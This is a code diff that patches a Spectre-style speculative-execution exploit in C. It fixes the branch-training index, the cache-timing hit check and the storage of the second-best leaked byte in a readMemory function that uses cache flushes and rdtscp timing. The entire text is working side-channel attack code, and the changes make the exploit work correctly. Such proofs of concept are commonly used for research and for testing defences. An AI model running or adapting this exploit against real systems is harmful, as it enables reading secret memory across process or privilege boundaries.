@@ -62,7 +62,7 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
             _mm_clflush(&array2[i*512]);
 
         // Train the BTB 
-        train_x = tries * array1_size;
+        train_x = tries % array1_size;
         for (int i = 29; i >= 0; i--) {
             
             _mm_clflush(&array1_size);
@@ -96,9 +96,8 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
             time2 = __rdtscp(&junk) - time1;
 
             // Check if cache hit, if so, increment score by one
-            if (time2 <= CACHE_HIT_THRESHOLD && i_mixed != array1[tries  % array1_size]) {
+            if (time2 <= CACHE_HIT_THRESHOLD && i_mixed != array1[tries  % array1_size]) 
                 results[i_mixed]++;
-            }
         }
 
         // Find the first and second highest results
@@ -121,8 +120,8 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
     results[0] ^= junk;
     value[0] = (uint8_t) j;
     score[0] = results[j];
-    value[0] = (uint8_t) k;
-    score[0] = results[k];
+    value[1] = (uint8_t) k;
+    score[1] = results[k];
 
 }
 
